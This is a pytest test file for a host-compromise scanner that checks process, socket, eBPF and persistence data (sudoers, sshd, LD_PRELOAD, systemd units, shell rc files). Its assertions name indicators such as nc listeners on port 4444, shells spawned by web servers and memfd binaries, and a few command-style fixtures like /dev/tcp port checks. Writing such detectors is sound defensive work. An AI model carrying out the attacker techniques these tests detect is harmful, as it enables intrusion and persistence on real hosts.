    assert "FLAG low listen_unknown tcp 0.0.0.0:4444 (1203/nc)" in ss
    assert "conn_flood 192.0.2.99: 20 established" in ss
    assert "8123" not in "".join(flags_of(ss))  # loopback is not wildcard


def test_ps_web_child_python_is_medium_and_names_masquerade_is_join_only():
    out = hs("ps", stdin=PS_BAD)
    assert "FLAG medium web_child_shell 2003/python3" in out
    assert "masquerade" not in out


def test_masquerade_rules():
    text = """## ps
 1 0 root 900 /sbin/init
 5 1 root 90 [kworker/0:1]
 6 1 root 90 [kthreadd]
 7 1 root 90 python3 /opt/app.py
 8 1 root 90 sleep 100
 9 1 root 90 -bash
## exes
1 /usr/lib/systemd/systemd
5 /tmp/real
6
7 /usr/bin/python3.11
8 /usr/bin/cat
9 /usr/bin/bash
"""
    out = hs("join", stdin=text)
    assert "FLAG high masquerade 5/[kworker/0:1]" in out
    assert "FLAG medium masquerade 8/sleep" in out
    assert not [f for f in flags_of(out) if "masquerade 1/" in f or "masquerade 6" in f or "masquerade 7" in f
                or "masquerade 9" in f]


def test_join_table_has_chain_connections_and_flags():
    out = hs("join", stdin=JOIN)
    block = out.split("PID 1203")[1].split("\n\n")[0]
    assert "PPID 900" in block and "USER bob" in block and "AGE 3m" in block
    assert "EXE /tmp/x (deleted)" in block
    assert "CHAIN  systemd(1) > sshd(812) > bash(900) > nc(1203)" in block or "init(1) > sshd(812) > bash(900) > nc(1203)" in block
    assert "LISTEN tcp 0.0.0.0:4444" in block
    assert "PEERS" in block and "FLAGS" in block and "deleted_exe" in block
    assert "FLAG high maps_anon_rwx pid 1203/nc [anon]" in out
    data = json.loads(hs("join", "-o", "json", stdin=JOIN))
    row = next(r for r in data["rows"] if r["pid"] == 1203)
    assert row["chain"][-3:] == ["sshd(812)", "bash(900)", "nc(1203)"]
    assert row["exe"] == "/tmp/x (deleted)" and "deleted_exe" in row["flags"]


def test_join_needs_sections_and_notes_unknown_ones():
    with pytest.raises(ModuleError, match="## ps"):
        hs("join", stdin="1 0 root 5 /sbin/init\n")
    out = hs("join", stdin="## ps\n1 0 root 5 /sbin/init\n## wat\nx\n")
    assert "note: ignored section(s): wat" in out


def test_comments_and_section_markers_are_ignored():
    text = "# sshrun web01 ps (untrusted remote output)\n## ps\n   \n# another\n" + PS_CLEAN
    out = hs("ps", stdin=text)
    assert "sshrun" not in out and out.endswith("no flags\n")
    assert "note:" not in out


def test_json_output_shape_and_determinism():
    out = hs("ps", "-o", "json", stdin=PS_BAD)
    data = json.loads(out)
    assert set(data) == {"rows", "flags"}
    assert all(set(f) == {"severity", "rule", "subject", "reason"} for f in data["flags"])
    assert data["rows"][0]["pid"] == 1
    assert out == hs("ps", "-o", "json", stdin=PS_BAD)
    sev = [hostscan.RANK[f["severity"]] for f in data["flags"]]
    assert sev == sorted(sev, reverse=True)
    assert json.loads(hs("exes", "-o", "json", stdin=EXES_CLEAN))["flags"] == []


def test_limit_caps_rows_but_not_flags():
    out = hs("ps", "--limit", "2", stdin=PS_BAD)
    assert "... " in out and "more row(s), raise --limit" in out
    assert "web_child_shell" in out and "sshd_child_nc" in out
    data = json.loads(hs("ps", "--limit", "3", "-o", "json", stdin=PS_BAD))
    assert len(data["rows"]) == 3 and data["truncated"] > 0
    with pytest.raises(ModuleError, match="--limit"):
        hs("ps", "--limit", "0", stdin=PS_CLEAN)


def test_default_limit_is_200():
    big = "".join(f"{i} 1 root 5 /usr/bin/x{i}\n" for i in range(1, 251))
    out = hs("ps", stdin=big)
    assert "50 more row(s)" in out


def test_malformed_input():
    out = hs("ps", stdin="garbage line\n1 0 root 5 /sbin/init\nx y z\n")
    assert "note: 2 malformed line(s) skipped" in out
    for sub, text in [("ps", "nothing useful here"), ("ss", "hello world"), ("exes", "abc def"),
                      ("maps", "not a maps line")]:
        with pytest.raises(ModuleError, match="look like"):
            hs(sub, stdin=text)
    for sub in SUBS:
        with pytest.raises(ModuleError, match="no input" if sub != "join" else "expected"):
            hs(sub, stdin="# only a comment\n")
    with pytest.raises(ModuleError, match="neither bpftool JSON nor `bpftool prog show` text"):
        hs("bpf", stdin="Error: can't get next program: Operation not permitted")
    with pytest.raises(ModuleError, match="not valid JSON"):
        hs("bpf", stdin='[{"id": 1,')
    with pytest.raises(ModuleError, match="look like"):
        hs("probes", stdin="what is this\n")
    # JSON of the wrong shape is tolerated
    assert hs("bpf", stdin='[1, "x", {"id": 1, "type": "tracing", "pids": 5}]').endswith("1 flag(s)\n")


PERSISTENCE = ["pkg-verify", "suid", "capabilities", "ld-preload", "units", "sudoers-files", "sshd-config", "shell-rc"]
SUBS = ["ps", "ss", "netstat", "lsof", "exes", "maps", "bpf", "probes", "join"] + PERSISTENCE


def test_argument_errors():
    with pytest.raises(ModuleError, match="invalid choice"):
        hs("frobnicate", stdin="x")
    with pytest.raises(ModuleError, match="required"):
        hs(stdin="x")
    with pytest.raises(ModuleError, match="--pid"):
        hs("maps", "--pid", "0", stdin=MAPS_CLEAN)
    with pytest.raises(ModuleError, match="invalid choice"):
        hs("ps", "-o", "xml", stdin=PS_CLEAN)


def test_maps_table_groups_by_path_and_names_pid():
    out = hs("maps", "--pid", "1203", stdin=MAPS_BAD)
    assert "pid 1203 [anon]" in out and "pid ? " not in out
    assert "/usr/sbin/sshd" in out and "[anon]" in out
    assert "(2 mappings" not in out
    assert "pid ? [anon]" in hs("maps", stdin=MAPS_BAD)
    assert "FLAG high maps_writable_file pid 1203 /tmp/inject.so" in out
    assert "FLAG high maps_memfd pid 1203 /memfd:x (deleted)" in out
    assert "FLAG medium maps_deleted_file pid 1203 /usr/lib/x86_64-linux-gnu/libdeleted.so.1 (deleted)" in out
    assert "dev/zero" not in "".join(flags_of(out))


def test_bpf_accepts_bare_arrays_of_each_kind():
    prog = '[{"id": 1, "type": "kprobe", "name": "x", "tag": "t", "pids": [{"pid": 5, "comm": "weird"}]}]'
    link = '[{"id": 2, "type": "perf_event", "prog_id": 1}]'
    mp = '[{"id": 3, "type": "sockmap", "name": "ports", "bytes_key": 4, "bytes_value": 4, "max_entries": 8}]'
    out = hs("bpf", stdin=prog + "\n" + link + "\n" + mp)
    assert rules_of(out) == {"bpf_prog", "bpf_link", "bpf_map_name"}
    assert "kind" not in out.splitlines()[0].lower() or "KIND" in out.splitlines()[0]


# ── user rules file ──────────────────────────────────────────────────────────

@pytest.fixture
def rules_file(tmp_path, monkeypatch):
    monkeypatch.setenv("SHELLCRAFT_HOME", str(tmp_path))

    def write(text):
        (tmp_path / "hostscan-rules.toml").write_text(text)
    return write


def test_rules_file_suppresses_ports_owners_and_paths(rules_file):
    rules_file('known_ports = [4444, 9001]\nknown_owners = ["evil", "mystery", "falco"]\n'
               'known_paths = ["/tmp/*", "/var/tmp/*", "/opt/app/*"]\n')
    ss = hs("ss", stdin=SS_BAD)
    assert "conn_rare_port" not in ss and "listen_unknown" not in ss
    assert "conn_shell_highport" in ss and "suppressed by hostscan-rules.toml" in ss
    bpf = hs("bpf", stdin=BPF_BAD)
    assert "prog 10 " not in bpf.split("FLAG", 1)[-1] or "bpf_prog" not in "".join(flags_of(bpf)).replace("bpf_prog_anon", "")
    assert "xdp" not in "".join(flags_of(bpf))
    assert "falco" not in "".join(flags_of(bpf))
    assert "deleted_exe" not in hs("exes", stdin="1203 /tmp/x (deleted)\n")
    assert hs("exes", stdin="1203 /tmp/x (deleted)\n").endswith("no flags\n")


def test_bad_rules_file_is_a_single_note_not_a_crash(rules_file):
    rules_file("this is = = not toml")
    out = hs("exes", stdin=EXES_BAD)
    notes = [ln for ln in out.splitlines() if ln.startswith("note: ")]
    assert len(notes) == 1 and "hostscan-rules.toml ignored" in notes[0]
    assert "deleted_exe" in out
    rules_file('known_ports = "22"\nknown_owners = [1]\nbogus = 1\n')
    notes = [ln for ln in hs("exes", stdin=EXES_BAD).splitlines() if ln.startswith("note: ")]
    assert len(notes) == 1 and "known_ports" in notes[0] and "known_owners" in notes[0] and "bogus" in notes[0]
    data = json.loads(hs("exes", "-o", "json", stdin=EXES_BAD))
    assert len(data["notes"]) == 1


def test_missing_rules_file_is_silent(tmp_path, monkeypatch):
    monkeypatch.setenv("SHELLCRAFT_HOME", str(tmp_path / "nothing-here"))
    assert "note:" not in hs("exes", stdin=EXES_CLEAN)


# ── EDR forms: ps -ef, ps aux, netstat, lsof, bpftool text ─────────────────────

def test_ps_ef_and_aux_rows_and_columns():
    ef = hs("ps", stdin=PS_EF_BAD)
    rows = {r["pid"]: r for r in json.loads(hs("ps", "-o", "json", stdin=PS_EF_BAD))["rows"]}
    assert rows[2002]["ppid"] == 2000 and rows[2002]["user"] == "www-data" and rows[2002]["age_s"] is None
    assert rows[1]["args"].startswith("/usr/lib/systemd/systemd --switched-root")
    assert "FLAG high web_child_shell 2002/sh: sh started by nginx (2000)" in ef
    table = hs("ps", stdin=PS_EF_CLEAN)
    assert "AGE" in table and "note:" not in table
    aux = hs("ps", stdin=PS_AUX_BAD)
    assert "note: ps aux has no parent pid column" in aux
    assert "FLAG high writable_exe 3000/miner" in aux
    rows = {r["pid"]: r for r in json.loads(hs("ps", "-o", "json", stdin=PS_AUX_CLEAN))["rows"]}
    assert rows[900]["user"] == "bob" and rows[900]["ppid"] is None and rows[900]["args"] == "-bash"


def test_ps_without_header_and_with_tuned_rows_mixed():
    no_header = "\n".join(PS_EF_BAD.splitlines()[1:])
    assert "web_child_shell" in hs("ps", stdin=no_header)
    assert "writable_exe" in hs("ps", stdin="\n".join(PS_AUX_BAD.splitlines()[1:]))
    assert "note:" not in hs("ps", stdin=PS_CLEAN)


def test_join_accepts_ps_ef():
    text = f"## ps\n{PS_EF_BAD}\n## ss\n{SS_CLEAN}\n## exes\n2002 /usr/bin/dash\n"
    out = hs("join", stdin=text)
    assert "web_child_shell" in out and "AGE ?" in out


def test_netstat_rows_match_ss_rows():
    out = hs("netstat", "-o", "json", stdin=NETSTAT_CLEAN)
    rows = json.loads(out)["rows"]
    assert {"proto": "tcp", "state": "LISTEN", "local": "0.0.0.0:22", "peer": "0.0.0.0:*",
            "procs": "812/sshd"} in rows
    assert {"proto": "tcp6", "state": "LISTEN", "local": ":::22", "peer": ":::*", "procs": "812/sshd"} in rows
    assert any(r["state"] == "ESTAB" and r["procs"] == "900/sshd" for r in rows)
    assert any(r["state"] == "TIME-WAIT" and r["procs"] == "" for r in rows)
    assert any(r["proto"] == "udp" and r["state"] == "UNCONN" and r["procs"] == "414/systemd-resolve" for r in rows)
    assert any(r["proto"] == "udp" and r["state"] == "ESTAB" for r in rows)
    assert any(r["proto"] == "udp6" and r["local"] == "[::]:123" and r["state"] == "UNCONN" for r in rows)
    assert "notes" not in json.loads(out)


def test_netstat_bad_rows_and_severities():
    out = hs("netstat", stdin=NETSTAT_BAD)
    assert "FLAG low listen_unknown tcp 0.0.0.0:4444 (1203/x)" in out
    assert any(f.startswith("FLAG high conn_rare_port") for f in flags_of(out))
    assert any(f.startswith("FLAG medium conn_shell_highport") for f in flags_of(out))
    assert any("tcp6 :::6667 (1204/socat)" in f for f in flags_of(out))
    assert "conn_flood 192.0.2.99" in out


def test_netstat_without_pid_column_and_unix_table():
    out = hs("netstat", stdin=NETSTAT_NO_PID)
    assert out.count("note:") == 1 and "no PID/Program name column" in out
    assert "FLAG low listen_unknown tcp 0.0.0.0:4444" in out
    unix = NETSTAT_CLEAN + "Active UNIX domain sockets (servers and established)\n" \
        "Proto RefCnt Flags       Type       State         I-Node   Path\n" \
        "unix  2      [ ACC ]     STREAM     LISTENING     12345    /run/dbus/system_bus_socket\n"
    assert "malformed" not in hs("netstat", stdin=unix)
    nonroot = NETSTAT_CLEAN.replace("812/sshd: /usr/sbin", "-").replace("2000/nginx: master", "-") \
        .replace("900/sshd: bob@pts/0", "-").replace("414/systemd-resolve", "-").replace("500/NetworkManager", "-")
    assert "every PID/Program name is empty" in hs("netstat", stdin=nonroot)


def test_lsof_rows_match_ss_rows():
    out = json.loads(hs("lsof", "-o", "json", stdin=LSOF_CLEAN))
    rows = out["rows"]
    assert {"proto": "tcp", "state": "LISTEN", "local": "*:22", "peer": "*:*", "procs": "812/sshd"} in rows
    assert any(r["proto"] == "tcp6" and r["state"] == "LISTEN" for r in rows)
    assert {"proto": "tcp", "state": "ESTAB", "local": "10.0.0.5:22", "peer": "203.0.113.9:51022",
            "procs": "900/sshd"} in rows
    assert any(r["proto"] == "tcp6" and r["state"] == "CLOSE-WAIT" and r["peer"] == "[2001:db8:400::347]:443"
               for r in rows)
    assert any(r["proto"] == "udp" and r["state"] == "UNCONN" and r["local"] == "*:123" for r in rows)
    assert "notes" not in out


def test_lsof_general_notes_and_names_instead_of_numbers():
    out = hs("lsof", stdin=LSOF_GENERAL_BAD)
    assert "FLAG high deleted_exe 1203/x: binary deleted from disk: /tmp/x" in out
    assert "FLAG high memfd_exe 1204/y" in out
    assert "FLAG high maps_deleted_file 2000/nginx /home/bob/libdeleted.so.1 (deleted)" in out
    assert "FLAG low lsof_deleted_file 5000/app /var/log/app.log (deleted)" in out
    assert "dbus-broker" not in "".join(flags_of(out))  # a memfd data file is not a lead
    assert "open-file row(s)" in out
    named = "COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\nsshd 812 root 3u IPv4 1 0t0 TCP web01:ssh (LISTEN)\n"
    assert "name hosts or services" in hs("lsof", stdin=named)
    assert "lsof: WARNING" not in hs("lsof", stdin="lsof: WARNING: can't stat() fuse file system /x\n" + LSOF_CLEAN)


def test_bpf_text_maps_to_the_json_fields():
    rows = json.loads(hs("bpf", "-o", "json", stdin=BPF_TEXT_BAD))["rows"]
    by_id = {r["id"]: r for r in rows}
    assert by_id[10]["type"] == "kprobe" and by_id[10]["name"] == "hook_getdents"
    assert by_id[10]["owners"] == "evil(1203)"
    assert by_id[10]["extra"] == "tag 99aabbccddeeff00 loaded 2026-11-01T10:01:40+0000 uid 0"
    assert by_id[12]["owners"] == "falco(500),bash(77)"
    assert by_id[11]["name"] == "" and by_id[11]["owners"] == ""
    out = hs("bpf", stdin=BPF_TEXT_BAD)
    assert "FLAG high bpf_prog_anon prog 11 kprobe (unnamed)" in out
    assert "FLAG info bpf_prog prog 12 tracepoint trace_exec" in out
    assert "FLAG medium bpf_prog prog 14 xdp filt" in out


def test_bpf_text_equals_json_for_the_same_programs():
    text = hs("bpf", "-o", "json", stdin="7: kprobe  name k  tag abc123  gpl\n\tloaded_at 2026-11-01T10:00:00+0000  uid 0\n"
              "\txlated 8B  jited 8B  memlock 4096B  map_ids 3,4\n\tpids bash(1234)\n")
    js = hs("bpf", "-o", "json", stdin=json.dumps([{"id": 7, "type": "kprobe", "name": "k", "tag": "abc123",
            "gpl_compatible": True, "loaded_at": "2026-11-01T10:00:00+0000", "uid": 0, "pids": [
                {"pid": 1234, "comm": "bash"}]}]))
    assert json.loads(text) == json.loads(js)


def test_unrecognised_formats_name_what_was_expected():
    for sub, junk, expect in [("ps", "Segmentation fault\n", "ps -ef"), ("netstat", "netstat: command not found\n", "netstat -tunap"),
                              ("lsof", "bash: lsof: command not found\n", "lsof -nP -i"),
                              ("bpf", "bpftool: command not found\n", "neither bpftool JSON")]:
        with pytest.raises(ModuleError, match=expect):
            hs(sub, stdin=junk)
    # a section of ps -ef is not mistaken for the tuned form, and netstat is not mistaken for ss
    with pytest.raises(ModuleError, match="look like"):
        hs("ss", stdin=NETSTAT_CLEAN)


def test_quiet_prints_flags_and_a_count_not_the_table():
    text = "1 0 root 500 /sbin/init\n812 1 www 90 nginx: worker process\n"
    quiet = hs("ps", "--quiet", stdin=text)
    assert quiet.strip() == "no flags in 2 row(s)" and "/sbin/init" not in quiet
    flagged = hs("ps", "-q", stdin=text + "900 812 www 5 /bin/sh -c id\n")
    assert "web_child_shell" in flagged and "nginx: worker" not in flagged and "flag(s) in 3 row(s)" in flagged


def test_quiet_json_has_a_row_count_and_no_rows():
    out = json.loads(hs("ps", "-q", "-o", "json", stdin="1 0 root 500 /sbin/init\n"))
    assert out["rows"] == [] and out["row_count"] == 1


# ── persistence checks ───────────────────────────────────────────────────────

def severity_of(out: str, rule: str, subject: str) -> str:
    return next(ln.split()[1] for ln in flags_of(out) if ln.split()[2] == rule and subject in ln)


@pytest.mark.parametrize("sub, text, rule, subject, severity", [
    ("pkg-verify", PKG_BAD, "pkg_binary_changed", "/usr/sbin/sshd", "critical"),
    ("pkg-verify", PKG_BAD, "pkg_binary_changed", "/usr/bin/curl", "high"),
    ("pkg-verify", PKG_BAD, "pkg_binary_changed", "pam_unix.so", "critical"),
    ("pkg-verify", PKG_BAD, "pkg_missing", "/usr/bin/sudo", "high"),
    ("pkg-verify", PKG_BAD, "pkg_missing", "/usr/bin/tar", "medium"),
    ("suid", SUID_BAD, "suid_writable_dir", "/var/tmp/helper", "critical"),
    ("suid", SUID_BAD, "suid_writable_dir", "/home/deploy/bin/tool", "high"),
    ("suid", SUID_BAD, "suid_interpreter", "/usr/bin/find", "critical"),
    ("suid", SUID_BAD, "suid_interpreter", "python3.11", "high"),
    ("capabilities", CAPS_BAD, "cap_dangerous", "/usr/bin/python3.11", "critical"),
    ("capabilities", CAPS_BAD, "cap_dangerous", "/usr/local/bin/backup", "high"),
    ("capabilities", CAPS_BAD, "cap_dangerous", "/opt/tools/helper", "high"),
    ("capabilities", CAPS_BAD, "cap_dangerous", "/home/alice/bin/newuidmap", "critical"),
    ("ld-preload", LDSO_BAD, "ld_preload_set", "libaudit_helper.so", "high"),
    ("ld-preload", LDSO_BAD, "ld_preload_set", "/dev/shm/.x/libh.so", "critical"),
    ("ld-preload", LDSO_BAD, "ld_path_writable", "/tmp/lib", "high"),
    ("ld-preload", LDSO_BAD, "ld_path_writable", "build/lib", "high"),
    ("units", UNITS_BAD, "unit_writable_exec", "dbus-helper.service", "high"),
    ("units", UNITS_BAD, "unit_writable_exec", "report.service", "medium"),
    ("units", UNITS_BAD, "unit_writable_exec", "cache.service", "high"),
    ("units", UNITS_BAD, "unit_download_exec", "update.service", "high"),
    ("units", UNITS_BAD, "unit_download_exec", "agent.service", "high"),
    ("sudoers-files", SUDOERS_BAD, "sudoers_nopasswd_all", "/etc/sudoers ALL", "critical"),
    ("sudoers-files", SUDOERS_BAD, "sudoers_nopasswd_all", "/etc/sudoers.d deploy", "high"),
    ("sudoers-files", SUDOERS_BAD, "sudoers_nopasswd_all", "Defaults", "medium"),
    ("sudoers-files", SUDOERS_BAD, "sudoers_writable_cmd", "/usr/bin/vim", "high"),
    ("sudoers-files", SUDOERS_BAD, "sudoers_writable_cmd", "/usr/bin/find", "high"),
    ("sudoers-files", SUDOERS_BAD, "sudoers_writable_cmd", "/home/alice/bin/fix.sh", "high"),
    ("sshd-config", SSHD_BAD, "sshd_root_login", "/etc/ssh/sshd_config", "medium"),
    ("sshd-config", SSHD_BAD, "sshd_empty_passwords", "/etc/ssh/sshd_config", "high"),
    ("sshd-config", SSHD_BAD, "sshd_keys_command", "/var/tmp/.k/keys.sh", "high"),
    ("sshd-config", SSHD_BAD, "sshd_keys_command", "/dev/shm/keys/%u", "high"),
    ("sshd-config", SSHD_BAD, "sshd_keys_command", "/opt/corp/bin/ldap-keys", "low"),
    ("shell-rc", RC_BAD, "rc_download_exec", "/etc/profile.d/update.sh", "high"),
    ("shell-rc", RC_BAD, "rc_ld_preload", "LD_PRELOAD", "high"),
    ("shell-rc", RC_BAD, "rc_alias_hijack", ".bashrc sudo", "high"),
    ("shell-rc", RC_BAD, "rc_alias_hijack", ".bashrc ssh", "medium"),
])
def test_persistence_severities(sub, text, rule, subject, severity):
    assert severity_of(hs(sub, stdin=text), rule, subject) == severity


def test_persistence_flag_counts_are_exact():
    # every bad sample is its clean sample plus bad lines, so nothing else may fire
    counts = {"pkg-verify": (PKG_BAD, 5), "suid": (SUID_BAD, 4), "capabilities": (CAPS_BAD, 4),
              "ld-preload": (LDSO_BAD, 4), "units": (UNITS_BAD, 5), "sudoers-files": (SUDOERS_BAD, 6),
              "sshd-config": (SSHD_BAD, 5), "shell-rc": (RC_BAD, 4)}
    for sub, (text, want) in counts.items():
        assert hs(sub, stdin=text).endswith(f"{want} flag(s)\n"), sub


def test_persistence_rows_explain_what_was_not_flagged():
    pkg = hs("pkg-verify", stdin=PKG_CLEAN)
    assert "/etc/nginx/nginx.conf" in pkg and "config file, edited: not a flag" in pkg
    assert "compiled Python cache" in pkg and "sshrun" not in pkg
    caps = hs("capabilities", stdin=CAPS_CLEAN)
    assert "cap_net_raw=ep" in caps and "shipped this way by the distribution" in caps
    sshd = hs("sshd-config", stdin=SSHD_CLEAN)
    assert "prohibit-password" in sshd and "a known directory-service helper" in sshd
    assert "only inside the Match block" in sshd
    units = hs("units", stdin=UNITS_CLEAN)
    assert units.count("/opt/webapp/.venv/bin/python") == 1  # the .wants link and the unit file are one row
    assert "notes.service" in units and "logrotate.timer" in units
    rc = json.loads(hs("shell-rc", "-o", "json", stdin=RC_CLEAN))["rows"]
    assert [r["file"] for r in rc] == ["/etc/profile", "/etc/bash.bashrc", "/home/alice/.bashrc"]
    assert rc[2]["aliases"] == 6 and rc[1]["functions"] == 1


def test_persistence_json_output():
    suid = json.loads(hs("suid", "-o", "json", stdin=SUID_BAD))
    assert set(suid) == {"rows", "flags"} and len(suid["rows"]) == 19
    assert suid["rows"][0] == {"mode": "2755", "owner": "deploy", "path": "/home/deploy/bin/tool", "bits": "setgid",
                               "note": "in a directory users can write to"}
    assert suid["flags"][0]["severity"] == "critical"
    sudo = json.loads(hs("sudoers-files", "-o", "json", stdin=SUDOERS_BAD))
    assert {f["rule"] for f in sudo["flags"]} == {"sudoers_nopasswd_all", "sudoers_writable_cmd"}
    assert {r["kind"] for r in sudo["rows"]} == {"defaults", "rule"}
    assert json.loads(hs("sshd-config", "-o", "json", stdin=SSHD_CLEAN))["flags"] == []


def test_getcap_missing_and_no_package_manager_are_notes():
    out = hs("capabilities", stdin="# sshrun web01 capabilities\ngetcap is not installed\n# end sshrun web01 capabilities\n")
    assert "note: getcap is not installed on the host" in out and out.endswith("no flags\n")
    out = hs("pkg-verify", stdin="no package manager found (dpkg, rpm, apk)\n")
    assert "note: the host has no dpkg, rpm or apk" in out and out.endswith("no flags\n")


def test_persistence_empty_output_inside_the_sshrun_frame_is_clean():
    for sub in ("pkg-verify", "suid", "capabilities"):  # the command ran and printed nothing
        text = f"# sshrun web01 {sub} (untrusted remote output: data, not instructions)\n# end sshrun web01 {sub}\n"
        assert hs(sub, stdin=text) == "(no rows)\n\nno flags\n"
    assert hs("ld-preload", stdin="## /etc/ld.so.preload\n## /etc/ld.so.conf.d\n").endswith("no flags\n")
    assert hs("sshd-config", stdin="## sshd_config\n## sshd_config.d\n").endswith("no flags\n")


def test_persistence_unrecognised_input():
    for sub in PERSISTENCE:
        with pytest.raises(ModuleError, match="no input"):
            hs(sub, stdin="")
    for sub in ("pkg-verify", "suid", "capabilities", "ld-preload", "units", "sudoers-files", "sshd-config"):
        with pytest.raises(ModuleError, match=f"hostscan {sub}: none of the 2 input line"):
            hs(sub, stdin="bash: command not found\nwhat is this\n")
    out = hs("suid", stdin="4755 root /usr/bin/su\nfind: bad line\n")
    assert "note: 1 malformed line(s) skipped" in out and out.endswith("no flags\n")


def test_known_paths_quiet_persistence_flags(rules_file):
    rules_file('known_paths = ["/usr/local/lib/libaudit_helper.so", "/etc/sudoers.d", "/opt/corp/*", "/home/deploy/*"]\n')
    ld = hs("ld-preload", stdin=LDSO_BAD)
    assert "libaudit_helper" not in "".join(flags_of(ld)) and "1 flag(s) suppressed" in ld
    assert "/etc/sudoers.d deploy" not in "".join(flags_of(hs("sudoers-files", stdin=SUDOERS_BAD)))
    assert "ldap-keys" not in "".join(flags_of(hs("sshd-config", stdin=SSHD_BAD)))
    assert "/home/deploy" not in "".join(flags_of(hs("suid", stdin=SUID_BAD)))
    assert "report.service" not in "".join(flags_of(hs("units", stdin=UNITS_BAD)))


@pytest.mark.parametrize("sub, text", [
    ("sudoers-files", "USER ALL=(root) NOPASSWD: cat /sys/kernel/tracing/kprobe_events\n"
                      "USER ALL=(root) NOPASSWD: grep -rh . /etc/sudoers.d\n"),
    ("sudoers-files", "deploy ALL=(root) NOPASSWD: /usr/bin/python3 /opt/webapp/manage.py migrate\n"),
    ("sudoers-files", "Defaults:deploy !requiretty\n%admin ALL=(ALL) ALL\n"),
    ("sshd-config", "PermitRootLogin prohibit-password\nPermitRootLogin without-password\nPermitRootLogin no\n"
                    "PermitRootLogin forced-commands-only\nAuthorizedKeysCommand none\n"),
    ("sshd-config", "authorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2\nAuthorizedKeysFile %h/.ssh/authorized_keys\n"),
    ("shell-rc", "alias sudo='sudo '\nalias ssh='ssh -A'\nalias gpg=gpg2\n"),
    ("shell-rc", "export IP=$(curl -s https://example.com/ip)\nwget -q -O ~/file.iso https://example.com/file.iso\n"),
    ("shell-rc", "timeout 1 bash -c '</dev/tcp/localhost/5432' && echo up\necho 'see /tmp/x; /tmp/y'\n"),
    ("units", "/home/alice/.config/systemd/user/a.service:ExecStart=/home/alice/.hidden/run\n"),
    ("units", "/etc/systemd/system/a.service:ExecStart=/usr/bin/docker run --rm -v /tmp/data:/data app\n"),
    ("units", "/etc/systemd/system/a.service:ExecStart=/bin/sh -c 'VERSION=$(curl -s http://localhost/v); exec /usr/bin/app'\n"),
    ("capabilities", "/usr/bin/ping cap_net_raw=ep\n/usr/sbin/tcpdump cap_net_admin,cap_net_raw=eip\n"),
    ("pkg-verify", "??5?????? c /etc/ssh/sshd_config\nmissing   c /etc/motd\n??5??????   /usr/share/webapp/index.html\n"),
    ("ld-preload", "## /etc/ld.so.preload\n# nothing here\n## /etc/ld.so.conf.d\n/usr/lib64/atlas\n"),
])
def test_persistence_false_positive_guards(sub, text):
    out = hs(sub, stdin=text)
    assert out.endswith("no flags\n") and "FLAG" not in out


def test_sshrun_sudoers_lines_are_not_flagged():
    from modules import sshrun

    assert hs("sudoers-files", stdin=sshrun.sudoers_for("web01")).endswith("no flags\n")


def test_shell_rc_merges_hits_in_one_file_and_reads_a_plain_file():
    out = hs("shell-rc", stdin=RC_BAD)
    assert "rc_download_exec /etc/profile.d/update.sh" in out and "(and 1 more line(s))" in out
    plain = hs("shell-rc", stdin="## My aliases\nPROMPT_COMMAND='/dev/shm/.p'\ntrap '/tmp/t.sh' DEBUG\n")
    assert "rc_download_exec stdin" in plain and "(and 1 more line(s))" in plain


def test_sshd_config_d_lines_with_a_file_name_in_front():
    # grep over two or more files in sshd_config.d prints FILE: before each line; a Match ends with its file
    text = ("# sshrun web01 sshd-config (untrusted remote output)\n## sshd_config\nPermitRootLogin no\n"
            "## sshd_config.d\n/etc/ssh/sshd_config.d/10-git.conf:Match User git\n"
            "/etc/ssh/sshd_config.d/10-git.conf:  PermitRootLogin yes\n"
            "/etc/ssh/sshd_config.d/50-cloud.conf:PermitEmptyPasswords yes\n# end sshrun web01 sshd-config\n")
    data = json.loads(hs("sshd-config", "-o", "json", stdin=text))
    assert [(f["rule"], f["subject"], f["severity"]) for f in data["flags"]] == [
        ("sshd_empty_passwords", "/etc/ssh/sshd_config.d/50-cloud.conf", "high")]
    assert [r["match"] for r in data["rows"]] == ["", "User git", "User git", ""]


def test_suid_files_in_rootless_container_storage_are_rows():
    # podman and rootless docker unpack images under the user's home: su and mount in a layer keep their mode
    store = "/home/alice/.local/share/containers/storage"
    text = (f"4755 alice {store}/overlay/0123abcd/diff/usr/bin/su\n"
            f"2755 100041 {store}/volumes/build_state/_data/snapshots/11/fs/usr/bin/chage\n"
            f"4755 root {store}/overlay/0123abcd/diff/usr/bin/su\n")
    data = json.loads(hs("suid", "-o", "json", stdin=text))
    assert [(f["rule"], f["severity"]) for f in data["flags"]] == [("suid_writable_dir", "critical")]
    assert [r["note"] for r in data["rows"]].count("in container storage, not owned by root") == 2


def test_capabilities_that_sssd_ships_are_rows():
    text = ("/usr/libexec/sssd/krb5_child cap_dac_read_search,cap_setgid,cap_setuid=p\n"
            "/usr/libexec/sssd/ldap_child cap_dac_read_search=p\n/usr/libexec/sssd/selinux_child cap_setgid,cap_setuid=p\n"
            "/usr/libexec/sssd/sssd_pam cap_dac_read_search=p\n")
    assert hs("capabilities", stdin=text).endswith("no flags\n")
    assert "cap_dangerous" in hs("capabilities", stdin=text.replace("/usr/libexec/sssd/", "/opt/tools/"))


def test_pkg_verify_says_how_many_files_it_could_not_read():
    text = "missing     /usr/bin/sudo (Permission denied)\n..?......    /usr/libexec/tool\n.M.......    /usr/bin/app\n"
    out = hs("pkg-verify", "-q", stdin=text)
    assert "note: 2 file(s) could not be read without root" in out and out.endswith("no flags in 3 row(s)\n")
